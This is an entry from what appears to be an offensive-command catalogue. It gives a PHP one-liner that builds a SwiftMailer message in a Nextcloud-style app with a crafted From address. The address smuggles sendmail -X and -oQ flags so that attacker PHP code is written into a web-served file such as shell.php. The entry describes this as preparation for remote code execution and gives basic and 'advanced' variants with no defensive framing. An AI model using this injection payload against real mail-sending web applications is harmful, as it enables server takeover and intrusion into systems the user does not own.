---
id: cmd-swiftmailer-create-inject
data: >-
  $message = \OC::$server->getMailer()->createMessage();
  $message->setFrom(['"Attacker@test.com\"
  -X/var/www/test_swiftmailer/phpcode.php -oQ/tmp test"@test.com']);
tags:
  - rce
  - injection
type: command
output: null
executor: php
platforms:
  - Web
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:23.874Z'
verified: false
validated: true
submitted: true
---
# create-swiftmailer-message-with-injection

## Command

```php
$message = \OC::$server->getMailer()->createMessage(); $message->setFrom(['"Attacker@test.com\" -X/var/www/test_swiftmailer/phpcode.php -oQ/tmp test"@test.com']);
```

## Description

This PHP command initializes a SwiftMailer message and sets a malicious 'From' address to inject sendmail options, preparing for RCE via file write and execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| createMessage() | Instantiates a new Swift_Message object via the mailer service | Yes |
| setFrom(array) | Sets the sender array with crafted string including -X (file append) and -oQ (queue dir) flags | Yes |
| Path in -X | Target file path for PHP code write (e.g., /var/www/test_swiftmailer/phpcode.php) | Yes |
| Path in -oQ | Queue directory for execution staging (e.g., /tmp) | Yes |

## Examples

### Basic Usage

```php
$message = \OC::$server->getMailer()->createMessage(); $message->setFrom(['"Attacker@test.com\" -X/var/www/test_swiftmailer/phpcode.php -oQ/tmp test"@test.com']);
```

### Advanced Usage

```php
// With custom paths
$message = \OC::$server->getMailer()->createMessage(); $message->setFrom(['"Attacker@test.com\" -X/var/www/shell.php -oQ/var/tmp test"@test.com']);
```

## Expected Output

A configured $message object with the From header containing injected commands. No immediate output, but var_dump($message->getFrom()) shows the malicious string. Successful if no parsing exceptions are thrown.

## Related

- [[commands/send-swiftmailer-message]]
- [[procedures/Craft-Malicious-Email-From-Address]]
